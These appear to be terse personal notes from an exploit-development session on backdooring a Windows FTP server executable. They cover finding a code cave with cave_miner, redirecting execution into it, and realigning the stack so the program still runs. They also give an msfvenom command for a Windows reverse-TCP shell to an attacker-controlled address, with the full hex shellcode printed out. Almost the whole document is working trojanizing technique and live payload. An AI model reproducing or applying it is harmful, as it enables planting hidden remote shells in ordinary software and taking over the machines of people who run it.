root@kali:~/Desktop/exploit Dev/backdooring# cave_miner search  --size 5000 FTPServer.exe 

    /========\
   /    ||    \
        ||
        ||
        ||
   CAVE || MINER
  
[*] Starting cave mining process...
    Searching for bytes: 0x00...

[*] New cave detected !
  section_name: .data
  cave_begin:   0x0000aad5
  cave_end:     0x0000cad8
  cave_size:    0x00002003
  vaddress:     0x0040aad5
  infos:        Readable, Writeable, Contain initialized data

[*] Mining finished.



004040C1  |. 8BEC           MOV EBP,ESP
004040C3  |. 6A FF          PUSH -1
004040C5  |. 68 80924000    PUSH FTPServe.00409280
004040CA  |. 68 64584000    PUSH FTPServe.00405864                   ;  SE handler installation


replaced MOv statement with JMP 0x0040aad5
now at end need to use 
MOV EBP,ESP
JMP 0x004040C3

Stack Alihghnment:
OLD ESP: 0012FF68
0012FF88
NEW ESP: 0012FD84

In the pasted hex shellcode search for Dec ESI, PUSH ESI , INC ESI and make DEC ESI to NOP

Now put breakpoint at Call EBP(last instruction of shellcode). run the PE file and when break point reached note the value of ESP.

Now find difference of ESP and after CALL EBP type 
ADD ESP, DIFFenced
POPFD
POPAD
<restore workflow>

use EXITFUNC=seh for msf patload creation:
root@kali:~/Desktop/exploit Dev/backdooring# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.108 LPORT=443  EXITFUNC=seh -f hex
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hex file: 648 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a8006c68020001bb89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbfe0e32ea68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5




